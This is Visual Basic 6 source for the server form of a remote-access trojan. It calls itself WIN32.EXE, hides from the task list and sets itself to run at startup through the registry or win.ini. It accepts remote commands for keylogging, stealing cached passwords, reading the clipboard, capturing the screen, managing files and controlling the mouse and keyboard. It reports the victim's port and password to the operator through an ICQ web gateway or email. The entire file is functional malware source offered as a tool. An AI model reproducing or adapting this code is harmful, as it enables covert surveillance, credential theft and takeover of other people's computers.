VERSION 5.00
Begin VB.Form frmServer 
   AutoRedraw      =   -1  'True
   Caption         =   "WIN32"
   ClientHeight    =   1680
   ClientLeft      =   60
   ClientTop       =   345
   ClientWidth     =   3000
   Icon            =   "frmServer.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   ScaleHeight     =   1680
   ScaleWidth      =   3000
   StartUpPosition =   2  'CenterScreen
   Visible         =   0   'False
   Begin VB.PictureBox Picture1 
      Height          =   375
      Left            =   6390
      ScaleHeight     =   315
      ScaleWidth      =   405
      TabIndex        =   15
      Top             =   2310
      Width           =   465
   End
   Begin VB.Timer TimerSave 
      Enabled         =   0   'False
      Interval        =   30000
      Left            =   4170
      Top             =   4080
   End
   Begin VB.Timer TimerKeyLogger 
      Enabled         =   0   'False
      Interval        =   1
      Left            =   4170
      Top             =   3630
   End
   Begin VB.Timer Timer3 
      Enabled         =   0   'False
      Interval        =   30000
      Left            =   4170
      Top             =   3180
   End
   Begin VB.Timer Timer2 
      Enabled         =   0   'False
      Interval        =   1000
      Left            =   4170
      Top             =   2730
   End
   Begin VB.Timer Timer1 
      Enabled         =   0   'False
      Interval        =   1000
      Left            =   4170
      Top             =   2280
   End
   Begin VB.TextBox Text2 
      Height          =   1995
      Left            =   150
      MultiLine       =   -1  'True
      ScrollBars      =   3  'Both
      TabIndex        =   14
      Top             =   3330
      Width           =   1575
   End
   Begin VB.DriveListBox Drive1 
      Height          =   315
      Left            =   4710
      TabIndex        =   13
      Top             =   3330
      Width           =   2565
   End
   Begin VB.FileListBox File1 
      Height          =   1650
      Left            =   6030
      TabIndex        =   12
      Top             =   3720
      Width           =   1245
   End
   Begin VB.DirListBox Dir1 
      Height          =   1665
      Left            =   4710
      TabIndex        =   11
      Top             =   3720
      Width           =   1245
   End
   Begin VB.ListBox List2 
      Height          =   450
      ItemData        =   "frmServer.frx":0442
      Left            =   4680
      List            =   "frmServer.frx":0444
      TabIndex        =   10
      Top             =   2790
      Width           =   1635
   End
   Begin VB.ListBox List1 
      Height          =   450
      ItemData        =   "frmServer.frx":0446
      Left            =   4680
      List            =   "frmServer.frx":0448
      TabIndex        =   9
      Top             =   2280
      Width           =   1635
   End
   Begin VB.TextBox txtAction 
      Height          =   285
      Left            =   2280
      TabIndex        =   8
      Top             =   2880
      Width           =   1095
   End
   Begin VB.TextBox SMTPServer 
      Height          =   285
      Left            =   150
      TabIndex        =   6
      Top             =   5430
      Width           =   1605
   End
   Begin VB.TextBox Text1 
      Height          =   1995
      Left            =   1800
      MultiLine       =   -1  'True
      ScrollBars      =   2  'Vertical
      TabIndex        =   5
      Top             =   3330
      Width           =   1665
   End
   Begin VB.PictureBox picTCPMail 
      Height          =   195
      Left            =   3090
      ScaleHeight     =   135
      ScaleWidth      =   60
      TabIndex        =   4
      Top             =   2250
      Width           =   120
   End
   Begin VB.TextBox txtPort 
      Height          =   285
      Left            =   2400
      TabIndex        =   2
      Text            =   "54896"
      Top             =   2220
      Width           =   615
   End
   Begin VB.TextBox txtPass 
      Height          =   285
      Left            =   1110
      TabIndex        =   1
      Top             =   2880
      Width           =   1095
   End
   Begin VB.TextBox txtData 
      Height          =   285
      Left            =   120
      TabIndex        =   0
      Top             =   2220
      Width           =   2175
   End
   Begin VB.Label lblTemp 
      AutoSize        =   -1  'True
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   240
      Left            =   2400
      TabIndex        =   7
      Top             =   2610
      Width           =   60
   End
   Begin VB.Label lblStatus 
      Height          =   195
      Left            =   150
      TabIndex        =   3
      Top             =   2610
      Width           =   2115
   End
End
Attribute VB_Name = "frmServer"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'Copyright © 2001 By TSH
Option Explicit
Private WithEvents TCPServer As clsSocket
Attribute TCPServer.VB_VarHelpID = -1
Private WithEvents TCPEMail As clsSocket
Attribute TCPEMail.VB_VarHelpID = -1

Dim MailSent As Boolean 'is mail sent
Dim SendEmail As Boolean, SendICQ As Boolean 'notify is send or not
Dim NameFrom, MailFrom, MailTo, Subject, Message As String 'e-mail info
Dim Step As Byte  'step for e-mail

Dim TimeOut As Byte 'time out count
Dim Check As Boolean  'this is check, remove password
Dim Profile As String 'LoadProfile name
Dim Startup As String 'startup method
Dim ServPath As String, RegAutoMethod As String 'server file info
Dim Info(1024) As String 'StringTokenizer data

Dim bFileArriving As Boolean 'is file arriving
Dim upFilename As String 'upload filename and save path
Dim sArriving As String 'transfer file data
Dim ReceiveData As Boolean 'has receive ACK
Dim DLCancel As Boolean 'is cancel download file

Dim a(9) As String 'specify keys for keylogger
Dim KeyLog As Boolean 'is open keylogger
Dim CurrentApp_hWnd As Long 'current application handle

Dim hmixer As Long             'mixer handle
Dim VolCtrl As MIXERCONTROL    'master volume control
Dim WavCtrl As MIXERCONTROL    'wave output volume control
Dim CDVol As MIXERCONTROL      'CD Volume

Private Const ServSetting As String = "WIN32.DLL" 'server setting filename
Private Const ServName As String = "WIN32.EXE" 'server filename
Private Const ServKey As String = "WIN32" 'server keyname

'SERVER.DLL : Server file Setting
'Data01 -> Startup method
'Data02 -> KeyLogger Enabled/Disabled
'Data03 -> Password protected
'Data04 -> Port number for listen
'Data05 -> Notify e-mail Enabled/Disabled
'Data06 -> Notify ICQ Enabled/Disabled
'Data07 -> SMTP Server (Mail Server)
'Data08 -> Notify E-mail address
'Data09 -> Notify ICQ number

Private Sub Form_Initialize()
  a(0) = ")"
  a(1) = "!"
  a(2) = "@"
  a(3) = "#"
  a(4) = "$"
  a(5) = "%"
  a(6) = "^"
  a(7) = "&"
  a(8) = "*"
  a(9) = "("
End Sub

Private Sub Form_Load()
Dim r, MyMenu As Integer

    Call RegisterServiceProcess(0, 1) 'hide program in Ctrl+Alt+Del list
    If App.PrevInstance = True Then
       Unload Me 'if Server already running, close it.
       End
    End If
    
    'make it can resize windows
    MyMenu = GetSystemMenu(Me.hwnd, 0)
    RemoveMenu MyMenu, &HF000, r

    '*********for testing, actually is not exists********
    'enable the below 2 commmands line for local testing
    'if no e-mail address enable it.
    'SaveProfile "DXData", "Data05", False, ServSetting
       
    'if no icq enable it.
    'SaveProfile "DXData", "Data06", False, ServSetting
    '****************************************************
    
    'hidden itself
    Call AutoRunHide
    
    Call StartWinsock("")
    TimeOut = 0
    Set TCPServer = New clsSocket
    TCPServer.sckHook Me.hwnd
    Set TCPEMail = New clsSocket
    TCPEMail.sckHook picTCPMail.hwnd
    
    'get protect password
    Profile = "Data03"
    LoadProfile "DXData", "Data03", ServSetting
    
    'get e-mail & ICQ notify is always or not
    SendICQ = False 'is sent
    MailSent = False 'is sent
    Profile = "Data05"
    LoadProfile "DXData", "Data05", ServSetting
    If SendEmail = False Then
       Profile = "Data06"
       LoadProfile "DXData", "Data06", ServSetting
    End If
    
    'get is keylogger or not
    Profile = "Data02"
    LoadProfile "DXData", "Data02", ServSetting
    
End Sub

Private Sub Form_QueryUnload(Cancel As Integer, UnloadMode As Integer)
    'get is keylogger or not
    Profile = "Data02"
    LoadProfile "DXData", "Data02", ServSetting
    
    If Not TCPServer Is Nothing Then
       TCPServer.sckClose
       TCPServer.sckUnHook
       Set TCPServer = Nothing
    End If
    If Not TCPEMail Is Nothing Then
       TCPEMail.sckClose
       TCPEMail.sckUnHook
       Set TCPEMail = Nothing
    End If
    Call EndWinsock
    Call UnloadAllForms
End Sub

Public Sub UnloadAllForms()
Dim Form As Form
   For Each Form In Forms
      Unload Form
      Set Form = Nothing
   Next Form
End Sub

Private Sub TCPServer_ConnectionRequest(RequestID As Long)
 If Trim(txtPass.Text) <> "" Then
    Timer1.Enabled = True  'time out timer running
 End If
    'true is single connection, false is multi connection
    TCPServer.sckAccept RequestID, True
    lblStatus.Caption = "Connected"
End Sub

Private Sub TCPServer_Connected()
    lblStatus.Caption = "Connected"
    If Trim(txtPass.Text) <> "" Then
       'send password request
       TCPServer.sckSendData "PWD_RQ"
    End If
    If TimerKeyLogger.Enabled = True Then
       TimerKeyLogger.Enabled = False
       TimerSave.Enabled = False
       Call saveKeyLogger_6
    End If
End Sub

Private Sub TCPServer_Disconnected()
    'get is keylogger or not
    Profile = "Data02"
    LoadProfile "DXData", "Data02", ServSetting
    lblStatus.Caption = "Disconnected"
    Call Relisten
End Sub

Private Sub TCPServer_Error(ByVal number As Long, ErrorDescription As String)
On Error Resume Next
    lblStatus.Caption = "Error"
    Call Relisten
End Sub

Private Sub TCPServer_DataArrival(pDATA As Variant)
'On Error GoTo errHandle
Dim Location As String
Dim ifreefile As Integer
Dim strdata As String
    
    strdata = ""
    DoEvents
    strdata = pDATA
    txtData.Text = pDATA
    txtData.Text = Trim(txtData.Text)
    txtPass.Text = Trim(txtPass.Text)
    
If Check = False Then 'if hasn't check password
   If txtPass.Text <> "" Then
      If txtData.Text = txtPass.Text Then 'password correct
         TCPServer.sckSendData "PASS" 'feedback
         Check = True
         Timer1.Enabled = False
         TimeOut = 0
         GoTo Last
     ElseIf txtData.Text <> txtPass.Text Then 'invalid password
         Call Relisten
         GoTo Last
     End If
  Else 'not need to check password
     TCPServer.sckSendData "PASS"
     Check = True
     Timer1.Enabled = False
     TimeOut = 0
     GoTo Last
  End If
End If
 
  If Check = True Then
     
     'is client send ACK
    If Left$(txtData, 8) = "RECVDATA" Then
       ReceiveData = True
       GoTo Last
    End If
    If Left$(txtData, 8) = "DLCANCEL" Then
       DLCancel = True
       GoTo Last
    End If
    If Left$(txtData, 8) = "UPCANCEL" Then
       'if cancel upload file
       'reset data
       bFileArriving = False
       txtAction.Text = ""
       upFilename = ""
       sArriving = ""
       DoEvents
       'if file already exist delete it
       If FileExists(upFilename) Then
          Kill upFilename
          DoEvents
       End If
       If FileExists(upFilename & ".OZip") Then
          Kill upFilename & ".OZip"
          DoEvents
       End If
       GoTo Last
    End If '"UPCANCEL"
    
     'for making faster
     If txtAction.Text = "" Then
        Location = Right$(txtData.Text, 2)
     End If
  
     Select Case Location
         Case 1: GoTo 1: Case 16: GoTo 16
         Case 2: GoTo 2: 'Case 17: GoTo 17
         Case 3: GoTo 3: Case 18: GoTo 18
         Case 4: GoTo 4: Case 19: GoTo 19
         Case 20: GoTo 20 'Case 5: GoTo 5:
         Case 6: GoTo 6: Case 21: GoTo 21
         Case 7: GoTo 7: Case 22: GoTo 22
         Case 8: GoTo 8: 'Case 23: GoTo 23
         Case 9: GoTo 9: Case 24: GoTo 24
         Case 25: GoTo 25 'Case 10: GoTo 10
         Case 26: GoTo 26 'Case 11: GoTo 11
         Case 12: GoTo 12: Case 27: GoTo 27
         Case 13: GoTo 13: Case 28: GoTo 28
         Case 14: GoTo 14: Case 29: GoTo 29
         Case 15: GoTo 15
     End Select
     
1:  If txtData.Text = "GET_PCINFO_01" Then 'get PC Info
       Call GetAllPCInfo_1
       GoTo Last
    End If
2:  If txtData.Text = "GET_PASS_02" Then 'get Password
       Call GetPasswords
       Call SendCachePass_2
       GoTo Last
    End If
3:  If txtData.Text = "CHANGE_PORT_03" Then 'change port
       txtAction.Text = "CHANGE_PORT_03"
       GoTo Last
    End If
    If txtAction.Text = "CHANGE_PORT_03" Then 'change port data
       SaveProfile "DXData", "Data04", txtData.Text, ServSetting
       txtAction.Text = ""
       GoTo Last
    End If
    If txtData.Text = "DEFAULT_PORT_03" Then 'change to default port
       SaveProfile "DXData", "Data04", "54896", ServSetting
       GoTo Last
    End If
    If txtData.Text = "SET_PASS_03" Then 'set password
       txtAction.Text = "SET_PASS_03"
       GoTo Last
    End If
    If txtAction.Text = "SET_PASS_03" Then 'set password data
       SaveProfile "DXData", "Data03", txtData.Text, ServSetting
       txtAction.Text = ""
       GoTo Last
    End If
    If txtData.Text = "REMOVE_PASS_03" Then 'remove password
       SaveProfile "DXData", "Data03", " ", ServSetting
       Check = True
       GoTo Last
    End If
    If Right(txtData, 9) = "KEYLOG_03" Then 'set enabled/disabled keylogger
       Call KeyLoggerEnabled_3(Int(Left(txtData, 1)))
       GoTo Last
    End If
    If txtData.Text = "SET_STARTUP_03" Then 'set startup method
       txtAction.Text = "SET_STARTUP_03"
       GoTo Last
    End If
    If txtAction.Text = "SET_STARTUP_03" Then 'set startup method data
       Call InitAutoRunHide
       'clear all first
       SaveProfile "windows", "run", " ", "win.ini"
       'delete autorun in registry
       If GetWindows Then
          DeleteStringKey HKEY_LOCAL_MACHINE, WinInfo & "\Run", ServKey
          DeleteStringKey HKEY_LOCAL_MACHINE, WinInfo & "\RunServices", ServKey
       Else
          DeleteStringKey HKEY_LOCAL_MACHINE, WinInfoNT & "\Run", ServKey
          DeleteStringKey HKEY_LOCAL_MACHINE, WinInfoNT & "\RunServices", ServKey
       End If
       
       'set startup method
       If txtData.Text = "0" Then
          SaveProfile "windows", "run", ServPath + "", "win.ini"
       ElseIf txtData.Text = "1" Then
              'write autorun in registry
              If GetWindows Then
                 SetStringKey HKEY_LOCAL_MACHINE, WinInfo & "\Run", ServKey, ServPath
              Else
                 SetStringKey HKEY_LOCAL_MACHINE, WinInfoNT & "\Run", ServKey, ServPath
              End If
       ElseIf txtData.Text = "2" Then
              'write autorun in registry
              If GetWindows Then
                 SetStringKey HKEY_LOCAL_MACHINE, WinInfo & "\RunServices", ServKey, ServPath
              Else
                 SetStringKey HKEY_LOCAL_MACHINE, WinInfoNT & "\RunServices", ServKey, ServPath
              End If
       End If
       SaveProfile "DXData", "Data01", txtData.Text, ServSetting
       txtAction.Text = ""
       GoTo Last
    End If
    If txtData.Text = "DISCONN_SERV_03" Then 'disconnect internet
       Call HangUp
       GoTo Last
    End If
    If txtData.Text = "RESTART_SERV_03" Then 'restart server
       Call Relisten
       GoTo Last
    End If
    If txtData.Text = "REMOVE_SERV_03" Then 'remove server
       Call RemoveServer_3
       GoTo Last
    End If
    If txtData.Text = "CLOSE_SERV_03" Then 'close server
       Call DoWinManager_14(ServKey & Delimiter & Me.hwnd & Delimiter, WM_CLOSE)
       GoTo Last
    End If
4:  If Right(txtData, 9) = "NOTIFY_04" Then 'set notify
       If Left(txtData, 1) = "1" Then 'email notify disable
          SaveProfile "DXData", "Data05", "False", ServSetting
       ElseIf Left(txtData, 1) = "3" Then 'ICQ notify disable
          SaveProfile "DXData", "Data06", "False", ServSetting
       Else
          txtAction.Text = txtData.Text
       End If
       GoTo Last
    End If
    If txtAction.Text = "0NOTIFY_04" Then 'email notify enable
       SaveProfile "DXData", "Data05", "True", ServSetting
       Call EmailNotifyEnabled(txtData)
       txtAction.Text = ""
       GoTo Last
    End If
    If txtAction.Text = "2NOTIFY_04" Then 'ICQ notify enable
       SaveProfile "DXData", "Data06", "True", ServSetting
       SaveProfile "DXData", "Data09", txtData, ServSetting 'icq number
       txtAction.Text = ""
       GoTo Last
    End If
5:
6:  If Right(txtData, 11) = "KEYBOARD_06" Then
       'if not open keylogger and send keystrokes
       If (Left(txtData, 1)) <> "0" And (Left(txtData, 1)) <> "1" Then
          Call Keyboard_6(Int(Left$(txtData, 1)))
       Else
          txtAction.Text = txtData.Text
       End If
       GoTo Last
    End If
    If txtAction.Text = "0KEYBOARD_06" Then 'open keylogger
       If txtData.Text = "START" Then 'start logger
          KeyLog = True
          TimerKeyLogger.Enabled = True
          TimerSave.Enabled = True
       ElseIf txtData.Text = "STOP" Then 'stop logger
          KeyLog = False
          TimerKeyLogger.Enabled = False
          TimerSave.Enabled = False
       ElseIf txtData.Text = "END" Then 'end logger
          KeyLog = False
          TimerKeyLogger.Enabled = False
          TimerSave.Enabled = False
          txtAction.Text = ""
       End If
       GoTo Last
    End If
    If txtAction.Text = "1KEYBOARD_06" Then 'send keystrokes
       If Left(txtData, 2) = "SK" Then 'send keys
          Call sendKeyStrokes_6(txtData)
       ElseIf txtData.Text = "END" Then 'close it
          txtAction.Text = ""
       ElseIf txtData.Text = "REFRESH" Then 'refresh active window list
          Call ActiveWindowList_6
       End If
       GoTo Last
    End If
7:  If Left$(txtData, 7) = "CHAT_07" Then 'chat open
       txtAction.Text = "CHAT_07"
       Call InitialChat_7(txtData) 'chat setting
       frmChat.Show
       GoTo Last
    End If
    If txtAction.Text = "CHAT_07" Then 'chat data
       If txtData.Text = "CLOSE" Then 'close it
          txtAction.Text = ""
          Call frmChat.closeChat
       Else
          Call frmChat.ReceiveText(txtData) 'show data
       End If
       GoTo Last
    End If
8:  If txtData.Text = "BROWSER_08" Then 'open browser
       txtAction.Text = "BROWSER_08"
       GoTo Last
    End If
    If txtAction.Text = "BROWSER_08" Then 'open browser data
       ShellExecute 0, "open", txtData.Text, vbNullString, vbNullString, SW_NORMAL
       txtAction.Text = ""
       GoTo Last
    End If
9:  If txtData.Text = "FINDFILES_09" Then 'find files
       txtAction.Text = "FINDFILES_09"
       GoTo Last
    End If
    If txtAction.Text = "FINDFILES_09" Then 'find files data
       Call FindFiles_9(txtData)
       txtAction.Text = ""
       GoTo Last
    End If
12: If txtData.Text = "SEND_MSG_12" Then 'send message
       txtAction.Text = "SEND_MSG_12"
       GoTo Last
    End If
    If txtAction.Text = "SEND_MSG_12" Then 'send message data
       Call SendMessage_12(txtData)
       txtAction.Text = ""
       GoTo Last
    End If
13: 'upload file
    If txtAction.Text = "UPLOAD_13" Then
       'is end of upload file
       If Right$(strdata, 7) = "FILEEND" Then
            bFileArriving = False
            sArriving = sArriving & Left$(strdata, Len(strdata) - 7)
            
            'if file already exist delete it
            If FileExists(upFilename) Then
               Kill upFilename
               DoEvents
            End If
            If FileExists(upFilename & ".OZip") Then
               Kill upFilename & ".OZip"
               DoEvents
            End If
            
            'save to file
            ifreefile = FreeFile
            Open upFilename & ".OZip" For Binary Access Write As #ifreefile
                 Put #ifreefile, 1, sArriving
            Close #ifreefile
            DoEvents
            
            'decompress file
            Call DecompressFile(upFilename & ".OZip", upFilename)
            DoEvents
            'reset data
            txtAction.Text = ""
            upFilename = ""
            sArriving = ""
            DoEvents
            GoTo Last
       ElseIf bFileArriving Then 'is transfer data arriving
            sArriving = sArriving & strdata
            DoEvents
            'send ACK
            TCPServer.sckSendData "RECVDATA"
            GoTo Last
       End If 'end if "FILEEND"
    End If 'end if upload file
    If txtData.Text = "DRIVE_13" Then 'get drive e.g C:\ D:\
       Call SendDrives_13
       GoTo Last
    End If
    If Left$(txtData, 7) = "FILE_13" Then 'get file list
       Call SendFiles_13(Right$(txtData, Len(txtData) - 7))
       GoTo Last
    End If
    If txtData.Text = "FILEGM_13" Then 'file manager function
       txtAction.Text = "FILEGM_13"
       GoTo Last
    End If
    If txtAction.Text = "FILEGM_13" Then 'file manager function data
       txtAction.Text = ""
       Call FileGM_13(Int(Left(txtData, 1)), Right(txtData, Len(txtData) - 1))
       GoTo Last
    End If
14: If txtData.Text = "REFRESH_14" Then 'Get the running programs
       Call RefreshWinhWnd_14
       GoTo Last
    End If
    If txtData.Text = "HIDE_14" Then 'hide the selected window
       txtAction.Text = "HIDE_14"
       GoTo Last
    End If
    If txtAction.Text = "HIDE_14" Then 'hide window name
       Call DoWinManager_14(txtData, SW_HIDE)
       txtAction.Text = ""
       GoTo Last
    End If
    If txtData.Text = "SHOW_14" Then 'show the selected window
       txtAction.Text = "SHOW_14"
       GoTo Last
    End If
    If txtAction.Text = "SHOW_14" Then 'show window name
       Call DoWinManager_14(txtData, SW_SHOW)
       txtAction.Text = ""
       GoTo Last
    End If
    If txtData.Text = "CLOSE_14" Then 'close the selected window
       txtAction.Text = "CLOSE_14"
       GoTo Last
    End If
    If txtAction.Text = "CLOSE_14" Then 'close window name
       Call DoWinManager_14(txtData, WM_CLOSE)
       txtAction.Text = ""
       GoTo Last
    End If
    If txtData.Text = "MIN_14" Then 'minimize the selected window
       txtAction.Text = "MIN_14"
       GoTo Last
    End If
    If txtAction.Text = "MIN_14" Then 'minimize window name
       Call DoWinManager_14(txtData, SW_MINIMIZE)
       txtAction.Text = ""
       GoTo Last
    End If
    If txtData.Text = "MAX_14" Then 'maximize the selected window
       txtAction.Text = "MAX_14"
       GoTo Last
    End If
    If txtAction.Text = "MAX_14" Then 'maximize window name
       Call DoWinManager_14(txtData, SW_MAXIMIZE)
       txtAction.Text = ""
       GoTo Last
    End If
    If txtData.Text = "FOCUS_14" Then 'focus the selected window
       txtAction.Text = "FOCUS_14"
       GoTo Last
    End If
    If txtAction.Text = "FOCUS_14" Then 'focus window name
       Call DoWinManager_14(txtData, -1)
       txtAction.Text = ""
       GoTo Last
    End If
    If txtData.Text = "DISABLEX_14" Then 'disabled X button the selected window
       txtAction.Text = "DISABLEX_14"
       GoTo Last
    End If
    If txtAction.Text = "DISABLEX_14" Then 'disabled X button window name
       Call DoWinManager_14(txtData, -2)
       txtAction.Text = ""
       GoTo Last
    End If
    If txtData.Text = "RENAME_14" Then  'rename the selected window
       txtAction.Text = "RENAME_14"
       GoTo Last
    End If
    If txtAction.Text = "RENAME_14" Then 'rename window name
       Call DoWinManager_14(txtData, -3)
       txtAction.Text = ""
       GoTo Last
    End If
15: If txtData.Text = "REFRESH_15" Then 'get the running process
       Call RefreshProcess_15
       GoTo Last
    End If
    If txtData.Text = "ENDTASK_15" Then 'terminate the running process
       txtAction.Text = "ENDTASK_15"
       GoTo Last
    End If
    If txtAction.Text = "ENDTASK_15" Then 'terminate process path
       Call TerminateProcess_15(txtData)
       txtAction.Text = ""
       GoTo Last
    End If
    If txtData.Text = "PRIORITY_15" Then 'thread priority the running process
       txtAction.Text = "PRIORITY_15"
       GoTo Last
    End If
    If txtAction.Text = "PRIORITY_15" Then 'thread priority process path
       Call ThreadPriority_15(txtData)
       txtAction.Text = ""
       GoTo Last
    End If
16: If txtData.Text = "READ_CLIP_16" Then 'get clipboard text
       TCPServer.sckSendData Clipboard.GetText
       GoTo Last
    End If
    If txtData.Text = "SET_CLIP_16" Then 'set clipboard text
       txtAction.Text = "SET_CLIP_16"
       GoTo Last
    End If
    If txtAction.Text = "SET_CLIP_16" Then 'set clipboard text data
       Clipboard.SetText txtData
       txtAction.Text = ""
       GoTo Last
    End If
    If txtData.Text = "EMPTY_CLIP_16" Then 'empty clipboard
       Clipboard.Clear
       GoTo Last
    End If
18: If txtData.Text = "0DESKTOP_18" Then 'open screen preview
       txtAction.Text = "0DESKTOP_18"
       GoTo Last
    End If
    If txtAction.Text = "0DESKTOP_18" Then 'open screen preview action
       If Left(txtData, 5) = "START" Then 'start capture
          Call frmSCRPreview.setInterval(Int(Right(txtData, Len(txtData) - 5)))
          Call frmSCRPreview.StartCapture
       ElseIf txtData.Text = "END" Then 'stop capture
          Call frmSCRPreview.EndCapture
       ElseIf txtData.Text = "EXIT" Then 'close it
          Call frmSCRPreview.EndCapture
          txtAction.Text = ""
       Else
          Call AllowMouseClick_18(txtData) 'allow mouse click
          DoEvents
       End If
       GoTo Last
    End If
    If txtData.Text = "1DESKTOP_18" Then 'full screen capture
       Call FullScreenCapture_18
       GoTo Last
    End If
19: If Right$(txtData, 10) = "FLIPSCR_19" Then 'flip screen
       Call FlipScreen_19(Int(Left(txtData, 1)))
       GoTo Last
    End If
20: If txtData.Text = "PRINT_20" Then 'print text
       txtAction.Text = "PRINT_20"
       GoTo Last
    End If
    If txtAction.Text = "PRINT_20" Then 'print text data
       Call PrintText(txtData)
       txtAction.Text = ""
       GoTo Last
    End If
21: If txtData.Text = "REFRESH_21" Then 'get the available resolutions
       Call RefreshResolution_21
       GoTo Last
    End If
    If txtData.Text = "CHANGE_21" Then 'change resolution
       txtAction.Text = "CHANGE_21"
       GoTo Last
    End If
    If txtAction.Text = "CHANGE_21" Then 'change resolution data
       Call ChangeResolution(CLng(txtData))
       txtAction.Text = ""
       GoTo Last
    End If
22: If txtData.Text = "WINCOLOR_22" Then 'change WIN colors
       txtAction.Text = "WINCOLOR_22"
       GoTo Last
    End If
    If txtAction.Text = "WINCOLOR_22" Then 'change WIN colors data
       Call ChangeColor(txtData)
       txtAction.Text = ""
       GoTo Last
    End If
24: If Right$(txtData, 11) = "SCRSAVER_24" Then 'screensaver
       If Left$(txtData, 1) = "1" Then 'run screensaver
          Call RunScrSaver
       Else
          txtAction.Text = "SCRSAVER_24"
       End If
       GoTo Last
    End If
    If txtAction.Text = "SCRSAVER_24" Then 'save screensaver settings
       Call SaveSettings_24(txtData)
       txtAction.Text = ""
       GoTo Last
    End If
25: If Right$(txtData, 13) = "RESTARTWIN_25" Then 'restart windows
       Call RestartWin_25(Int(Left$(txtData, 1)))
       GoTo Last
    End If
26: If Right$(txtData, 8) = "MOUSE_26" Then 'mouse action
       If Left$(txtData, 1) = "0" Then 'set double click time
          txtAction.Text = "0MOUSE_26"
       ElseIf Left$(txtData, 1) = "5" Then 'move/control mouse
          txtAction.Text = "5MOUSE_26"
       Else
          Call Mouse_26(Int(Left$(txtData, 1)), "")
       End If
       GoTo Last
    End If
    If txtAction.Text = "5MOUSE_26" Then 'move/control mouse now
       Call controlMouse_26(txtData)
       GoTo Last
    End If
    If txtAction.Text = "0MOUSE_26" Then 'set double click time data
       Call Mouse_26(Int(Left$(txtData, 1)), Right$(txtData, Len(txtData) - 1))
       txtAction.Text = ""
       GoTo Last
    End If
27: If Right$(txtData, 8) = "SOUND_27" Then
       'if set mute or unmute
       If Left$(txtData, 1) = "3" Or Left$(txtData, 1) = "4" Then
          Call Sound_27(Int(Left$(txtData, 1)), -1)
       Else
          txtAction.Text = "SOUND_27"
       End If
       GoTo Last
    End If
    If txtAction.Text = "SOUND_27" Then 'set sound settings
       If SoundCardExits Then
          Call Sound_27(Int(Left(txtData, 1)), CLng(Right(txtData, Len(txtData) - 1)))
          TCPServer.sckSendData "Y"
       Else
          TCPServer.sckSendData "No sound card."
       End If
       txtAction.Text = ""
       GoTo Last
    End If
    If txtData.Text = "SOUNDREAD_27" Then 'read sound settings
       If SoundCardExits Then
          'Call ReadSoundSetting_27
          TCPServer.sckSendData ReadSoundSetting_27
       Else
          TCPServer.sckSendData "No sound card."
       End If
       txtAction.Text = ""
       GoTo Last
    End If
28: If Right$(txtData, 11) = "TIMEDATE_28" Then 'time/date
       If Left$(txtData, 1) = "2" Then 'get time/date
          Call GetTimeDate_28
       Else
          txtAction.Text = "TIMEDATE_28"
       End If
       GoTo Last
    End If
    If txtAction.Text = "TIMEDATE_28" Then 'set time/date
       Call SetTimeDate_28(txtData)
       txtAction.Text = ""
       GoTo Last
    End If
29: If Right$(txtData, 8) = "EXTRA_29" Then 'extra fun function
       Call Extra_29(Int(Left$(txtData, 2)))
       GoTo Last
    End If

  End If 'end of Check = True
  
Last:
txtData.Text = ""
DoEvents
Exit Sub

errHandle:
Call Relisten
End Sub

Private Function GetScreenX() As Integer
GetScreenX = Screen.Width / Screen.TwipsPerPixelX
End Function

Private Function GetScreenY() As Integer
GetScreenY = Screen.Height / Screen.TwipsPerPixelY
End Function

Private Sub TCPEMail_Connected()
Step = 0
Timer3.Enabled = True
End Sub

Private Sub TCPEMail_Error(ByVal number As Long, ErrorDescription As String)
TCPEMail.sckClose
End Sub

Private Sub TCPEMail_DataArrival(pDATA As Variant)
Dim sRes As String 'response from SMTP server

    Text2.Text = Text2.Text & pDATA & vbCrLf
    sRes = Mid(pDATA, 1, 3)
    If sRes = "250" Then
        Step = Step + 1
    End If
    If sRes = "220" Then
        Step = Step + 1
    End If
    If sRes = "354" Then
        Step = Step + 1
    End If
    If Left(sRes, 1) = "5" Then
        lblStatus.Caption = "Error."
        Text2.Text = ""
        TCPEMail.sckClose
    End If
    Call SendMailNotify
End Sub

Private Sub Timer1_Timer()
    If Check = True Then  'protect client has check password correct, not to be disconnected.
       TimeOut = 0
       Timer1.Enabled = False
       Exit Sub
    End If
    TimeOut = TimeOut + 1
    If TimeOut = 30 Then  'time out value(second)
       lblStatus.Caption = "Check password time out."
       Call Relisten
    End If
End Sub

Private Sub Timer2_Timer() 'detect is online
On Error Resume Next
Dim msgICQ, cData, cSend As String

   If Connected = True Then
      TimerKeyLogger.Enabled = False
      TimerSave.Enabled = False
      Call InitSendMail
      If SendEmail And MailSent = False Then
         TCPEMail.sckConnect Trim(SMTPServer.Text), "25"
      ElseIf SendICQ Then
         Profile = "Data09"
         LoadProfile "DXData", "Data09", ServSetting
         msgICQ = "Port:" & txtPort.Text & "+Pass:" & txtPass.Text
         cData = "from=anonymous&fromemail=victim@server.com&subject=Omega+Help&body=" & msgICQ & "&to=" & Trim(MailTo) & "&Send=" & """"
         cSend = "POST /scripts/WWPMsg.dll HTTP/1.0" & vbCrLf
         cSend = cSend & "Referer: http://wwp.mirabilis.com" & vbCrLf
         cSend = cSend & "User-Agent: Mozilla/4.06 (Win95; I)" & vbCrLf
         cSend = cSend & "Connection: Keep-Alive" & vbCrLf
         cSend = cSend & "Host: wwp.mirabilis.com:80" & vbCrLf
         cSend = cSend & "Content-type: application/x-www-form-urlencoded" & vbCrLf
         cSend = cSend & "Content-length: " & Len(cData) & vbCrLf
         cSend = cSend & "Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */*" & vbCrLf & vbCrLf
         cSend = cSend & cData & vbCrLf & vbCrLf & vbCrLf & vbCrLf
         
         TCPServer.sckClose
         TCPServer.sckConnect "wwp.mirabilis.com", "80"
         DoEvents
         Do While TCPServer.State <> sckConnected
            DoEvents
            Sleep 100
         Loop
         TCPServer.sckSendData cSend
         DoEvents
         Sleep 200
         Timer3.Enabled = False
         lblStatus.Caption = "ICQ sent"
         DoEvents
         TCPEMail.sckClose
         TCPServer.sckClose
         Call Listening
      End If
      Timer2.Enabled = False
   End If
End Sub

Private Sub Timer3_Timer() 'time out of e-mail
   TCPEMail.sckClose
   Timer3.Enabled = False
   Timer2.Enabled = True
End Sub

